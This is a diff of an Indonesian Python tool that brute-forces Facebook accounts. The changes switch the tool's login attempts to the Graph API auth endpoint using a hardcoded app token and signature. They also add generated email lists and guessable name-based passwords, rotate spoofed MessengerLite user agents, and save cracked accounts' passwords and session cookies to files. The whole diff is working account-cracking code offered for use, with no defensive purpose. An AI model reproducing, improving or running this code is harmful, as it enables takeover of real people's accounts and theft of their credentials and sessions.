@@ -1,7 +1,5 @@
 ###----------[ IMPORT MODULE LAIN ]---------- ###
-
 import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
-
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup as parser
 from datetime import date,datetime
@@ -49,7 +47,8 @@ versi_app = str(random.randint(111111111,999999999))
 for z in range(200):
 	versi_android = str(random.randint(4,12))+".0.0"
 	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-	ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android} ; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBBD/L-03K;FBDV/L-03K;FBSV/{versi_android} ;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
+	ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; LDN-L21 Build/HUAWEILDN-L21) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/155323366;FBDM/"+"{density=2.0,width=720,height=1360}"+";FBLC/en_US;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.mlite;FBDV/LDN-L21;FBSV/{versi_android};FBOP/19;FBCA/armeabi-v7a:armeabi;]"
+#[FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook/lge;FBBD/FEVER;FBDV/FEVER;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
 	if ua in ugent:pass
 	else:ugent.append(ua)
 	
@@ -78,9 +77,9 @@ class Logo:
   //  \__  |: \.        |(|  _  \\  // ___)     {P2}██████████████████████[/]
  (:   / "\ |.  \    /:  ||: |_)  :)(:  (      
   \_______)|___|\__/|___|(_______/  \__/      Made By {M2}Indonesia {P2}Coder
-{B2}╭──────────────────────╮{B2}╭───────────────╮{B2}╭────────────────────────────╮
-{B2}│ {P2}Author : Fall Xavier {B2}│{B2}│ {P2}Version : 2.0 {B2}│{B2}│ {P2}Dont't Recode My Tools Bro {B2}│
-{B2}╰──────────────────────╯{B2}╰───────────────╯{B2}╰────────────────────────────╯""",width=80,style=f"{color_panel}"))
+{color_text}╭──────────────────────╮{color_text}╭───────────────╮{color_text}╭────────────────────────────╮
+{color_text}│ {P2}Author : Fall Xavier {color_text}│{color_text}│ {P2}Version : 2.0 {color_text}│{color_text}│ {P2}Dont't Recode My Tools Bro {color_text}│
+{color_text}╰──────────────────────╯{color_text}╰───────────────╯{color_text}╰────────────────────────────╯""",width=80,style=f"{color_panel}"))
 	
 ###----------[ BAGIAN LOGIN ]---------- ###
 class Login:
@@ -212,10 +211,11 @@ class Menu:
 			
 		###----------[ KOMENTAR ]---------- ###
 		elif menu in["4","04"]:
-			prints(Panel(f"""{P2}masukan nama untuk email, format email akan selalu @gmail.com""",width=80,style=f"{color_panel}"))
+			prints(Panel(f"""{P2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan nama : ")
+			format = console.input(f" {H2}• {P2}masukan format : ")
 			limit = console.input(f" {H2}• {P2}masukan limit : ")
-			Dump(cookie).Dump_Email(user,limit)
+			Dump(cookie).Dump_Email(user,format,limit)
 			Crack().atursandi()
 			
 		###----------[ PENCARIAN NAMA ]---------- ###
@@ -352,10 +352,13 @@ class Dump:
 		except:pass
 		
 	###----------[ DUMP FILE ]---------- ###
-	def Dump_Email(self,nama,limit):
+	def Dump_Email(self,nama,format,limit):
 		try:
 			for z in range(int(limit)):
-				email = nama+str(z)+"@gmail.com<=>"+nama
+				if len(nama.split()) > 1:
+					email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(format)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
+				else:
+					email = str(nama)+str(z)+str(format)+"<=>"+str(nama)
 				if email in tampung:pass
 				else:tampung.append(email)
 		except:pass
@@ -438,6 +441,7 @@ class Crack:
 								pwx.append(depan+belakang)
 							else:
 								pwx.append(depan+belakang)
+								pwx.append(belakang)
 								pwx.append(belakang+"123")
 								pwx.append(belakang+"1234")
 								pwx.append(belakang+"12345")
@@ -455,54 +459,27 @@ class Crack:
 			for pw in pwx:
 				pw = pw.lower()
 				ua = random.choice(ugent)
-				ses.headers.update({
-                "Host": "m.facebook.com",
-                "upgrade-insecure-requests": "1",
-                "user-agent": ua,
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                "dnt": "1",
-                "x-requested-with": "mark.via.gp",
-                "sec-fetch-site": "none",
-                "sec-fetch-mode": "navigate",
-                "sec-fetch-user": "?1",
-				"referer": "https://m.facebook.com/",
-				"accept-encoding": "gzip, deflate",
-				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-			r = ses.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F")
-			params = {
-                 'm_ts': re.search('name="m_ts" value="(.*?)"',str(r.text)).group(1), 
-                 'li': re.search('name="li" value="(.*?)"',str(r.text)).group(1), 
-                 'try_number': '0', 
-                 'unrecognized_tries': '0', 
-                 'email': email, 
-                 'prefill_contact_point': email, 
-                 'prefill_source': 'browser_dropdown', 
-                 'prefill_type': 'contact_point', 
-                 'first_prefill_source': 'header', 
-                 'first_prefill_type': 'contact_point', 
-                 'had_cp_prefilled': 'true', 
-                 'had_password_prefilled': 'false', 
-                 'is_smart_lock': 'false', 
-                 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(r.text)).group(1),
-                 'pass': pw,
-                 'jazoest': re.search('name="jazoest" value="(.*?)"',str(r.text)).group(1),
-                 'lsd': re.search('name="lsd" value="(.*?)"',str(r.text)).group(1),}
-			headers = {
-                "Host": "m.facebook.com",
-                "content-length": "1749",
-                "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(r.text)).group(1),
-                "user-agent": ua,
-                "content-type": "application/x-www-form-urlencoded",
-                "accept": "*/*",
-                "origin": "https://m.facebook.com",
-                "x-requested-with": "mark.via.gp",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
-				"referer": "https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
-				"accept-encoding": "gzip, deflate",
-				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			pos = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101", params=params, headers=headers, allow_redirects=False)
+				params = {
+					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+					"sdk_version": {random.randint(1,26)}, 
+					"email": email,
+					"locale": "en_US",
+					"password": pw,
+					"sdk": "android",
+					"generate_session_cookies": "1",
+					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+				}
+				headers = {
+					"Host": "graph.facebook.com",
+					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+					"x-fb-sim-hni": str(random.randint(20000, 40000)),
+					"x-fb-net-hni": str(random.randint(20000, 40000)),
+					"x-fb-connection-quality": "EXCELLENT",
+					"user-agent": ua,
+					"content-type": "application/x-www-form-urlencoded",
+					"x-fb-http-engine": "Liger"
+				}
+				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					user = re.findall("c_user=(\d+)",coki)[0]
@@ -517,8 +494,7 @@ class Crack:
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
 						break
 				elif "User must verify their account" in post.text:
-					jason = post.json()["error_data"].encode("utf-8")
-					user = re.findall('"uid":(.*),"show_native_checkpoints"', jason)[0]
+					user = post.json()["error"]["error_data"]["uid"]
 					if user in self.ok or user in self.cp:
 						break
 					else:
@@ -674,4 +650,3 @@ if __name__=="__main__":
 	except:pass
 	Menu().menu()
 #Gunakan Facebook dalam mode dasar dengan Telkomsel
-
